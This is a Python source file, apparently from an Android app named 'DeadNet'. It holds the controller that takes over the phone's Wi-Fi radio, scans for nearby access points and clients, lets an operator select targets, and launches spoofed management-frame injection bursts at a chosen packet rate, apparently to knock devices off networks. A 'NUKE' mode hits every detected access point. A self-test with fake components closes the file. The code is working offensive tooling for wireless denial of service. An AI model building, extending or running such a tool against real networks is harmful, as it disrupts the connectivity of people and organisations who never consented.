"""
AppController (v3 M4) — the ANDROID<->APP{RECON,ATTACK} state machine.

This is the brain of the own-the-PHY redesign. It bridges the Kivy screens to the
v3 engine layer and encodes the operator workflow from V3_PLAN §3:

    launch ─► OWN PHY ──► APP/RECON   (monitor; Android guarded)
                            │  live target list (recon.TargetStore)
                            ▼
                          SELECT      (operator picks targets / S<pattern>)
                            ▼
                          APP/ATTACK  (managed vif up, unassociated; mgmt-TX)
                            │  live: accepted/N, actual pps
                            ▼
                          RELEASE ─► ANDROID (baseline restored, guard off)

Ownership + mode are owned by `engine.phyguard.PhyGuard`; target discovery by
`engine.recon.ReconScanner` (monitor); the attack by
`engine.attack.AttackController` driving `engine.mgmt_tx` through the patched
cfg80211 (gated by `engine.capgate.CapGate`). Only one PhyMode is ever live —
the single RF chain forbids monitor + managed together — so RECON capture is
torn down before an ATTACK burst and restored after.

Headless-safe: the Kivy Logger import is guarded and every privileged call is
funnelled through the engine modules, so this file imports and its state-machine
self-test runs off-device (all engine collaborators are injectable). Stdlib +
engine only.
"""
from __future__ import annotations

import enum
import threading
from typing import Callable, Dict, List, Optional

try:
    from kivy.logger import Logger
except Exception:  # off-device
    class _L:
        def info(self, *a, **k): pass
        def error(self, *a, **k): pass
        def warning(self, *a, **k): pass
    Logger = _L()

from engine.contracts import Ownership, PhyMode
from engine.recon import TargetStore, ReconScanner, DEFAULT_CHANNELS
from engine.attack import (
    AttackController, AttackPlan, ATTACK_MODES, from_recon, select_spoof,
    build_spoof_set,
)
from engine.mgmt_tx import MgmtTxController, MgmtCtx, MgmtTarget, DEFAULT_FREQ

DEADNET_PREF = "DeadNet"

# Attack-mode ids that need no recon selection (wildcard / self-targeting).
NUKE_MODE = 0


class AppState(enum.Enum):
    """Flattened view of PhyGuard ownership+mode for the UI."""
    ANDROID = "android"   # Ownership.ANDROID — radio with the framework
    RECON = "recon"       # Ownership.APP + PhyMode.RECON — monitor detect
    ATTACK = "attack"     # Ownership.APP + PhyMode.ATTACK — mgmt-TX injection


class AppController:
    def __init__(self, appdir: str, managed_iface: str = "wlan0",
                 mon_iface: str = "mon0",
                 on_event: Optional[Callable[[str, dict], None]] = None,
                 phyguard=None, tx=None, capgate=None, attack=None,
                 recon_factory=None):
        self.appdir = appdir
        self.managed_iface = managed_iface
        self.mon_iface = mon_iface
        self._emit = on_event or (lambda kind, data: None)

        # --- engine collaborators (all injectable for the off-device test) ---
        if phyguard is None:
            from engine.phyguard import PhyGuard
            phyguard = PhyGuard(managed_iface, mon_iface)
        self.phyguard = phyguard
        self.store = TargetStore()
        self.tx = tx if tx is not None else MgmtTxController(appdir)
        if capgate is None:
            from engine.capgate import CapGate
            capgate = CapGate(iface=managed_iface, tx_send=self.tx.send)
        self.capgate = capgate
        self.attack = attack if attack is not None else AttackController(
            self.tx.send, ensure_attack=self._ensure_attack_mode)
        # recon_factory(mon_iface, store, on_target, set_channel) -> ReconScanner
        self._recon_factory = recon_factory or self._default_recon_factory
        self.recon: Optional[ReconScanner] = None

        # --- operator state ---
        self.recon_channel: int = 6
        self.selection_spec: str = ""
        self.spoof: List[MgmtTarget] = []          # resolved spoof set (the picks)
        self.attack_mode: int = 1                  # catalogue id (0 = NUKE)
        self.pps: int = 100
        self.budget: int = 0                       # 0 = until stopped
        self.patched: Optional[bool] = None        # last CapGate decision
        self.cap_reason: str = ""

        self._attack_stop: Optional[threading.Event] = None
        self._attack_thread: Optional[threading.Thread] = None
        self._tick: Dict[str, int] = {"sent": 0, "ok": 0, "pps": 0}
        self._lock = threading.RLock()

    # -- recon scanner builder --------------------------------------------
    def _default_recon_factory(self, mon_iface, store, on_target, set_channel):
        return ReconScanner(mon_iface=mon_iface, store=store, on_target=on_target,
                            set_channel=set_channel, channels=list(DEFAULT_CHANNELS))

    # -- event helper ------------------------------------------------------
    def emit(self, kind: str, **data) -> None:
        try:
            self._emit(kind, data)
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: on_event({kind}) raised {exc}")

    # -- state view --------------------------------------------------------
    @property
    def state(self) -> AppState:
        if self.phyguard.ownership != Ownership.APP:
            return AppState.ANDROID
        return AppState.ATTACK if self.phyguard.mode == PhyMode.ATTACK else AppState.RECON

    def is_attacking(self) -> bool:
        t = self._attack_thread
        return t is not None and t.is_alive()

    def capabilities(self) -> dict:
        return {
            "state": self.state.value,
            "ownership": self.phyguard.ownership.value,
            "mode": self.phyguard.mode.value if self.phyguard.mode else "",
            "patched": self.patched,
            "cap_reason": self.cap_reason,
            "targets": self.store.count(),
            "aps": self.store.count("ap"),
            "stations": self.store.count("station"),
            "selected": len(self.spoof),
            "attacking": self.is_attacking(),
        }

    def _emit_state(self) -> None:
        self.emit("state", **self.capabilities())

    # =====================================================================
    # OWN / RECON  (ANDROID -> APP/RECON: seize monitor + start discovery)
    # =====================================================================
    def own_recon(self, channel: Optional[int] = None) -> bool:
        """Seize the PHY into RECON and start monitor-mode target discovery.
        From ATTACK this just switches back to RECON. Android is guarded out."""
        with self._lock:
            ch = self.recon_channel if channel is None else int(channel)
            self.recon_channel = ch
            if not self.phyguard.own(ch):
                self.emit("error", msg="could not seize PHY for RECON")
                self._emit_state()
                return False
            self._start_recon()
            self.emit("recon", channel=ch)
            self._emit_state()
            return True

    def _start_recon(self) -> None:
        if self.recon is not None:
            return
        self.recon = self._recon_factory(
            self.mon_iface, self.store, self._on_target,
            getattr(self.phyguard.radio, "set_channel", None))
        try:
            self.recon.start()
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: recon start failed: {exc}")

    def _stop_recon(self) -> None:
        r, self.recon = self.recon, None
        if r is not None:
            try:
                r.stop()
            except Exception as exc:  # noqa: BLE001
                Logger.error(f"{DEADNET_PREF}: recon stop failed: {exc}")

    def _on_target(self, t) -> None:
        # throttled at the UI layer; just surface that the inventory grew/changed
        self.emit("target", mac=t.mac, kind=t.kind, ssid=t.ssid,
                  channel=t.channel, rssi=t.rssi)

    def targets(self, kind: Optional[str] = None) -> List[dict]:
        """Current recon inventory as dicts (APs + stations), RSSI-sorted."""
        return [t.as_dict() for t in self.store.snapshot(kind)]

    def clear_targets(self) -> None:
        self.store.clear()
        self.emit("targets_cleared")

    # =====================================================================
    # SELECT  (resolve a selection spec against the recon inventory)
    # =====================================================================
    def set_selection(self, spec: str) -> int:
        """Resolve a selection spec ('3' | '1,3' | 'S<glob>' | 'S~<ere>' | 'all')
        against the recon inventory into the spoof set. Returns the count."""
        self.selection_spec = (spec or "").strip()
        mts = [from_recon(t) for t in self.store.snapshot()]
        self.spoof = select_spoof(mts, self.selection_spec, default_freq=DEFAULT_FREQ)
        self.emit("selection", spec=self.selection_spec, n=len(self.spoof),
                  targets=[self._mt_dict(m) for m in self.spoof])
        return len(self.spoof)

    def clear_selection(self) -> None:
        self.selection_spec = ""
        self.spoof = []
        self.emit("selection", spec="", n=0, targets=[])

    @staticmethod
    def _mt_dict(m: MgmtTarget) -> dict:
        return {"mac": m.mac, "typ": m.typ, "freq": m.freq,
                "label": m.label, "ssid": m.ssid}

    def selected(self) -> List[dict]:
        return [self._mt_dict(m) for m in self.spoof]

    def set_mode(self, mode: int) -> None:
        self.attack_mode = int(mode)
        self.emit("attack_mode", mode=self.attack_mode,
                  label=ATTACK_MODES.get(self.attack_mode, "NUKE" if self.attack_mode == NUKE_MODE else "?"))

    def set_pps(self, pps: int) -> None:
        self.pps = max(1, int(pps))

    # =====================================================================
    # CAPABILITY GATE  (patched cfg80211 required for ATTACK)
    # =====================================================================
    def check_capability(self) -> bool:
        """Run CapGate (stages the injector, sends an inert spoofed-SA probe).
        Caches the decision; ATTACK refuses unless patched. Needs the PHY in a
        TX-capable state (owned, or associated) for the probe to be meaningful."""
        try:
            self.tx.stage()
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: injector stage failed: {exc}")
        try:
            res = self.capgate.check()
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: capgate failed: {exc}")
            self.patched, self.cap_reason = False, f"capgate error: {exc}"
            self.emit("capgate", patched=False, reason=self.cap_reason)
            return False
        self.patched = bool(res.patched)
        self.cap_reason = res.reason
        self.emit("capgate", patched=self.patched, reason=self.cap_reason,
                  decided_by=res.decided_by)
        return self.patched

    # =====================================================================
    # ATTACK  (APP/RECON -> APP/ATTACK: scheduled mgmt-TX at the selection)
    # =====================================================================
    def _ensure_attack_mode(self) -> bool:
        """Stop RECON capture (frees the RF chain) then switch the PHY to ATTACK."""
        self._stop_recon()
        return self.phyguard.to_attack()

    def _spoof_for_run(self) -> List[MgmtTarget]:
        if self.attack_mode == NUKE_MODE:
            # NUKE: wildcard over every detected AP (fall back to the picks).
            mts = [from_recon(t) for t in self.store.snapshot("ap")]
            nuke = build_spoof_set(mts, "all", own_freq=self.recon_freq())
            return nuke or self.spoof
        return list(self.spoof)

    def recon_freq(self) -> int:
        from engine.recon import channel_to_freq
        f = channel_to_freq(self.recon_channel)
        return f or DEFAULT_FREQ

    def start_attack(self, budget: Optional[int] = None) -> bool:
        """Begin the mgmt-TX burst over the current selection. Gated by CapGate:
        refuses on a stock (unpatched) cfg80211. Runs on a worker thread; live
        progress arrives via the 'attack_tick' event."""
        with self._lock:
            if self.is_attacking():
                self.emit("error", msg="already attacking")
                return False
            if self.phyguard.ownership != Ownership.APP:
                self.emit("error", msg="own the PHY (RECON) before attacking")
                return False
            if self.patched is None:
                self.check_capability()
            if not self.patched:
                self.emit("error", msg=f"ATTACK blocked — {self.cap_reason or 'stock cfg80211'}")
                return False
            spoof = self._spoof_for_run()
            if not spoof:
                self.emit("error", msg="no targets selected (pick from RECON, or use NUKE)")
                return False
            plan = AttackPlan(
                mode=self.attack_mode, spoof=spoof, iface=self.managed_iface,
                pps=self.pps, budget=(self.budget if budget is None else int(budget)),
                title=ATTACK_MODES.get(self.attack_mode, "nuke"),
                nuke=(self.attack_mode == NUKE_MODE))
            ctx = MgmtCtx()
            self._attack_stop = threading.Event()
            self._tick = {"sent": 0, "ok": 0, "pps": plan.pps}
            self._attack_thread = threading.Thread(
                target=self._attack_worker, args=(plan, ctx), name="attack", daemon=True)
            self._attack_thread.start()
            self._emit_state()
            self.emit("attack_start", mode=self.attack_mode, n=len(spoof), pps=self.pps)
            return True

    def _attack_worker(self, plan: AttackPlan, ctx: MgmtCtx) -> None:
        def on_tick(d: dict):
            self._tick = d
            self.emit("attack_tick", **d)
        try:
            summary = self.attack.run(plan, ctx, on_tick=on_tick, stop=self._attack_stop)
        except Exception as exc:  # noqa: BLE001
            Logger.error(f"{DEADNET_PREF}: attack run failed: {exc}")
            summary = {"sent": self._tick.get("sent", 0), "ok": self._tick.get("ok", 0)}
        # fold the authoritative final counts in (on_tick only fires every ~pps
        # frames, so a short bounded burst may never have ticked)
        self._tick = {"sent": int(summary.get("sent", 0)),
                      "ok": int(summary.get("ok", 0)),
                      "pps": int(summary.get("target_pps", plan.pps))}
        self.emit("attack_done", **summary)
        self._emit_state()

    def stop_attack(self, back_to_recon: bool = True) -> None:
        """Halt the burst. By default returns the PHY to RECON (re-adds mon0 and
        restarts discovery) so the operator can reselect."""
        with self._lock:
            if self._attack_stop is not None:
                self._attack_stop.set()
            t = self._attack_thread
        if t is not None and t.is_alive():
            t.join(timeout=3.0)
        with self._lock:
            self._attack_thread = None
            self._attack_stop = None
            if back_to_recon and self.phyguard.ownership == Ownership.APP:
                if self.phyguard.to_recon():
                    self._start_recon()
            self._emit_state()

    def state_metrics(self) -> dict:
        """Live attack gauges (polled on a Clock tick)."""
        t = self._tick or {}
        sent = int(t.get("sent", 0))
        ok = int(t.get("ok", 0))
        return {"sent": sent, "accepted": ok,
                "miss": max(0, sent - ok),
                "pps": int(t.get("pps", self.pps)),
                "targets": len(self.spoof),
                "attacking": self.is_attacking()}

    # =====================================================================
    # RELEASE / SHUTDOWN
    # =====================================================================
    def release(self) -> bool:
        """Give the PHY back to Android and restore the baseline. Safe to re-call.
        Stops any attack burst and the RECON capture first."""
        with self._lock:
            if self._attack_stop is not None:
                self._attack_stop.set()
            t = self._attack_thread
        if t is not None and t.is_alive():
            t.join(timeout=3.0)
        with self._lock:
            self._attack_thread = None
            self._attack_stop = None
            self._stop_recon()
            try:
                self.tx.close()
            except Exception:  # noqa: BLE001
                pass
            ok = True
            try:
                ok = self.phyguard.release()
            except Exception as exc:  # noqa: BLE001
                Logger.error(f"{DEADNET_PREF}: release failed: {exc}")
                ok = False
            self.emit("released")
            self._emit_state()
            return bool(ok)

    def shutdown(self) -> None:
        self.release()


if __name__ == "__main__":
    # Off-device state-machine self-test. Every engine collaborator is faked, so
    # we exercise ANDROID -> RECON -> (select) -> (capgate) -> ATTACK -> RECON ->
    # RELEASE and assert the transitions + gating without a device or root.
    import tempfile
    import types

    events: List[tuple] = []

    class FakeRadio:
        def set_channel(self, ch): return True

    class FakePhyGuard:
        def __init__(self):
            self.ownership = Ownership.ANDROID
            self.mode = None
            self.radio = FakeRadio()
            self.log = []
        def own(self, ch=6):
            self.ownership = Ownership.APP; self.mode = PhyMode.RECON
            self.log.append(("own", ch)); return True
        def to_attack(self):
            self.mode = PhyMode.ATTACK; self.log.append(("to_attack",)); return True
        def to_recon(self, ch=None):
            self.mode = PhyMode.RECON; self.log.append(("to_recon", ch)); return True
        def release(self):
            self.ownership = Ownership.ANDROID; self.mode = None
            self.log.append(("release",)); return True

    class FakeScanner:
        def __init__(self, store):
            self.store = store; self.started = False; self.stopped = False
        def start(self):
            self.started = True
            # seed a couple of targets as if captured off the air
            from engine.recon import Target, now_ms
            self.store.upsert(Target(mac="aa:bb:cc:00:11:22", kind="ap", ssid="HomeNet",
                                     channel=6, freq=2437, rssi=-40, last_seen_ms=now_ms()))
            self.store.upsert(Target(mac="11:22:33:44:55:66", kind="ap", ssid="Cafe",
                                     channel=36, freq=5180, rssi=-60, last_seen_ms=now_ms()))
        def stop(self):
            self.stopped = True

    scanners: List[FakeScanner] = []
    def fake_recon_factory(mon, store, on_target, set_channel):
        s = FakeScanner(store); scanners.append(s); return s

    class FakeTx:
        def __init__(self): self.staged = False; self.closed = False
        def stage(self): self.staged = True; return "/x/nl80211_inject.arm64"
        def send(self, iface, freq, hexframe, fast=False): return (True, False)
        def close(self): self.closed = True

    class FakeCap:
        def __init__(self, patched=True): self._p = patched
        def check(self, allow_probe=True):
            return types.SimpleNamespace(patched=self._p, decided_by="probe",
                                         reason=("patched" if self._p else "stock"))

    tx = FakeTx()
    pg = FakePhyGuard()
    ctl = AppController(tempfile.mkdtemp(), phyguard=pg, tx=tx, capgate=FakeCap(True),
                        recon_factory=fake_recon_factory,
                        on_event=lambda k, d: events.append((k, d)))

    # 1) ANDROID baseline
    assert ctl.state is AppState.ANDROID
    # 2) OWN -> RECON, scanner started, targets appear
    assert ctl.own_recon(6) is True
    assert ctl.state is AppState.RECON and scanners[0].started
    assert ctl.store.count("ap") == 2, ctl.store.count("ap")
    assert pg.log[0] == ("own", 6)

    # 3) SELECT: index + glob against the recon inventory
    assert ctl.set_selection("all") == 2
    assert ctl.set_selection("SHome*") == 1 and ctl.spoof[0].ssid == "HomeNet"
    assert ctl.set_selection("1,2") == 2

    # 4) ATTACK gated by CapGate; patched -> runs, switches to ATTACK, stops recon
    ctl.set_mode(1); ctl.set_pps(200); ctl.budget = 10
    assert ctl.start_attack() is True
    ctl._attack_thread.join(timeout=3.0)
    assert ("to_attack",) in pg.log, pg.log
    assert scanners[0].stopped, "recon capture must stop before an attack burst"
    m = ctl.state_metrics()
    assert m["sent"] == 10 and m["accepted"] == 10, m

    # 5) stop_attack -> back to RECON (mon re-added, fresh scanner started)
    ctl.stop_attack(back_to_recon=True)
    assert pg.mode == PhyMode.RECON and scanners[-1].started

    # 6) CapGate refusal on stock cfg80211 blocks ATTACK
    ctl2 = AppController(tempfile.mkdtemp(), phyguard=FakePhyGuard(), tx=FakeTx(),
                         capgate=FakeCap(False), recon_factory=fake_recon_factory,
                         on_event=lambda k, d: None)
    ctl2.own_recon(6); ctl2.set_selection("all")
    assert ctl2.start_attack() is False and ctl2.patched is False

    # 7) RELEASE -> ANDROID, tx closed
    assert ctl.release() is True
    assert ctl.state is AppState.ANDROID and tx.closed

    kinds = [k for k, _ in events]
    for need in ("state", "recon", "selection", "attack_start", "attack_done", "released"):
        assert need in kinds, (need, kinds)
    print("AppController (v3 M4 state machine) PASS")
